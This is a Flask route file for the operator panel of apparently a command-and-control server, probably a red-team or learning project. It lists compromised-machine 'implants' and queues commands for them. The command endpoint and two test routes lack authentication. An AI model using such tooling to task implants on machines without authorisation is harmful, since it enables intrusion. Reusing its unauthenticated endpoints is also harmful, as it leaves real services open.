from flask import (
    Blueprint, flash, g, jsonify, make_response,
    redirect, render_template, request, Response, url_for
)
from werkzeug.exceptions import abort

from datetime import datetime
import json

from .auth import login_required
from .db import db
from .models import Command, Implant, Operator

# TODO: Delete later, for testing only
from pprint import pprint


bp = Blueprint('operator', __name__)


@bp.route('/')
@login_required
def index():
    operators = Operator.query.all()
    return render_template('operator/index.html', operators=operators)


@bp.route('/implant/<id>', methods=['GET'])
@login_required
def get_implant(id):

    if not id:
        error = "implant id is required."
        response = {"error": error}
        return make_response(jsonify(response), 400)

    implant = Implant.query.filter_by(id=id).first()

    if not implant:
        error = "no implant with that id."
        response = {"error": error}
        return make_response(jsonify(response), 400)

    return render_template('operator/implant.html', implant=implant)


@bp.route('/implants', methods=['GET'])
@login_required
def list_all_implants():

    implants = Implant.query.all()
    # TODO: add custom message for when there are no implants
    # (instead of showing an empty list)

    return render_template('operator/implants.html', implants=implants)


# TODO: Get operator_id from the session using @login_required and g.operator to
# prevent logged-out people from acessing stuff
@bp.route('/storeCommandForImplant', methods=['POST'])
def store_command_for_implant():

    data = request.json
    command_type = data['command_type']
    command_text = data['command_text']
    implant_id = data['implant_id']
    operator_id = data['operator_id']
    error = None

    if not command_type:
        error = 'command_type is required.'
    elif not command_text:
        error = 'command_text is required.'
    elif not implant_id:
        error = 'implant_id is required.'
    elif not operator_id:
        error = 'operator_id is required.'

    if error:
        response = {"error": error}
        return make_response(jsonify(response), 400)

    operator = Operator.query.filter_by(id=operator_id).first()

    if not operator:
        error = "operator_id is not valid."
        response = {"error": error}
        return make_response(jsonify(response), 400)

    implant = Implant.query.filter_by(id=implant_id).first()

    if not implant:
        error = "implant_id is not valid."
        response = {"error": error}
        return make_response(jsonify(response), 400)

    # TODO: Get length of timestamp, update database
    time_issued = datetime.now()
    status = "not_taken_by_implant"
    command_result = None

    command = Command(
        command_type=command_type,
        command_text=command_text,
        implant_id=implant_id,
        operator_id=operator_id,
        time_issued=time_issued,
        status=status,
        command_result=command_result
    )

    db.session.add(command)
    db.session.commit()

    response = {"msg": "Command stored"}
    return make_response(jsonify(response), 200)


# For testing only, delete later
@bp.route('/make-test-implant', methods=['GET'])
def make_test_implant():
    id = None

    try:
        implant = Implant(
            computer_name="test_computer_name",
            computer_user="test_computer_user",
            computer_privileges="test_computer_privileges",
            connecting_ip_address="test_connecting_ip_address",
            last_seen="test_last_seen",
            expected_check_in="test_expected_check_in",
            computer_guid="test_computer_guid",
            session_key="test_session_key",
            sleep="test_sleep",
            jitter="test_jitter",
            first_seen="test_first_seen"
        )

        db.session.add(implant)
        db.session.commit()

        # Source: https://stackoverflow.com/questions/1316952/sqlalchemy-flush-and-get-inserted-id
        db.session.flush()
        db.session.refresh(implant, attribute_names=[])
        id = implant.id
    except Exception as e:
        print(f"Error in make_fake_implant: {e}")
        response = {"error": e}
        return make_response(jsonify(response), 500)

    response = {
        "id": id
    }

    response = jsonify(response)

    return make_response(response, 200)


# For testing only, delete later
@bp.route('/make-test-operator', methods=['GET'])
def make_test_operator():
    id = None

    try:
        operator = Operator(
            username="test_username",
            password_hash="test_password_hash"
        )

        db.session.add(operator)
        db.session.commit()

        # Source: https://stackoverflow.com/questions/1316952/sqlalchemy-flush-and-get-inserted-id
        db.session.flush()
        db.session.refresh(operator, attribute_names=[])
        id = operator.id
    except Exception as e:
        print(f"Error in make_fake_operator: {e}")
        response = {"error": e}
        return make_response(jsonify(response), 500)

    response = {
        "id": id
    }

    response = jsonify(response)

    return make_response(response, 200)
